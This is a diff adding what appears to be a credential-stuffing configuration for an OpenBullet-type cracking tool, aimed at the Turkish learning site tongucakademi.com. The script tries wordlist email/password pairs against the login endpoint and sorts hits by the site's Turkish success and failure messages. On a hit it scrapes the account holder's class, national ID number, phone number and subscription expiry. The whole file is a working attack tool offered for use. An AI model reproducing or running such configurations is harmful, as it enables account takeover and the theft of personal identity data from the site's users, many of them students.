@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Tonguc Akademi",
+  "SuggestedBots": 130,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-27T22:45:11.6972656+03:00",
+  "AdditionalInfo": "www.siberdeyiz.com",
+  "Author": "By_Num",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tongucakademi.com/Login/Login" 
+  CONTENT "{\"Email\":\"<USER>\",\"Parola\":\"<PASS>\",\"Hatirla\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Giriş yapıldı" 
+  KEYCHAIN Failure OR 
+    KEY "Kullanıcı adı parola eşleşmiyor" 
+
+REQUEST GET "https://www.tongucakademi.com/profil/bilgilerim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#SINIFI PARSE "<SOURCE>" LR "<a href=\"#\" title=\"Dersler\">" "</a><i" -> CAP "SINIFI::" 
+
+#T.C PARSE "<SOURCE>" LR "id=\"kimlikno\" value=\"" "\"" -> CAP "T.C =" 
+
+#TELEFON PARSE "<SOURCE>" LR "placeholder=\"05xxxxxxxxx\" value=\"" "\"" -> CAP "telefon" 
+
+REQUEST GET "https://www.tongucakademi.com/profil/siparislerim" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<p style=\"color:green\">" "</p>" -> CAP "HESAP BİTİŞ (Tarih yoksa Satın alma yoktur)::" 
+
